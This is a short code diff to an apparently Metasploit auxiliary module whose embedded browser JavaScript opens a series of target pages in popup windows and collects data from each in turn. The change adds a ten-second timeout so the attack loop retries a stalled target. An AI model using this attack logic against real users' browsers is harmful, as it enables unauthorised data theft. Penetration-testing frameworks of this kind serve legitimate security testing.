@@ -112,12 +112,18 @@ class Metasploit3 < Msf::Auxiliary
           if (!n) {
             n = cachedN || randomString();
             var w = window.open(target, n);
+            var deadman = setTimeout(function(){
+              clearInterval(clear);
+              clearInterval(clear2);
+              attack(targets[i], null, i, n);
+            }, 10000);
             var clear = setInterval(function(){
               if (received[i]) {
                 try{ w.stop(); }catch(e){}
                 try{ w.location='data:text/html,<p>Loading...</p>'; }catch(e){}
                 clearInterval(clear);
                 clearInterval(clear2);
+                clearTimeout(deadman);
                 if (i < targets.length-1) {
                   setTimeout(function(){ attack(targets[i+1], null, i+1, n); },100);
                 } else {
